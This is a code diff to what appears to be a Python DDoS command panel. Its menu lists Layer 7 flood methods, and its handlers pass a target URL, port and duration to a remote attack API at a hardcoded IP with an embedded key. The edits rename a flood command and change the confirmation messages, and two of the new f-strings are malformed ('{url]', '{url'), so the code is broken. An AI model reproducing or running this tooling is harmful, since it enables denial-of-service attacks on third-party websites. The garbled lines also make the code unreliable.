@@ -119,7 +119,7 @@ def layer7():
                               \x1b[38;2;233;233;233m║    \x1b[38;2;0;255;255mLAYER 7    \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m╔══════════════╩════════╦══════╩══════════════╗
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttps-spammer       \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-raw          \x1b[38;2;233;233;233m║
-               \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttps-vip           \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;233;233;233m║
+               \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttps-vip           \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-vip            \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mtls                 \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;233;233;233m║
@@ -460,7 +460,7 @@ def main():
                 time = cnc.split()[3]
                 try:
                     r = requests.get(f'http://213.32.61.80:8080/api?key=keyasdas12&host={url}&port={port}&time={time}&method=http-premium')
-                    print(r.text)
+                    print(f'Attack sent to {url]')
                 except:
                     print("API Server Error")
             except IndexError:
@@ -492,7 +492,7 @@ def main():
                 time = cnc.split()[3]
                 try:
                     r = requests.get(f'http://213.32.61.80:8080/api?key=keyasdas12&host={url}&port={port}&time={time}&method=https-premium')
-                    print(r.text)
+                    print(f'Attack sent to {url')
                 except:
                     print("API Server Error")
             except IndexError:
@@ -530,14 +530,14 @@ def main():
                 print('Usage: tls <url> <time> <req_per_second> <threads>')
                 print('Example: tls http://example.com 60 80 50')
 
-        elif "httpflood" in cnc:
+        elif "http-flood" in cnc:
             try:
                 url = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
                 try:
                     r = requests.get(f'http://213.32.61.80:8080/api?key=keyasdas12&host={url}&port={port}&time={time}&method=http-flood')
-                    print(r.text)
+                    print(f'Attack sent to {url')
                 except:
                     print("API Server Error")
             except IndexError:
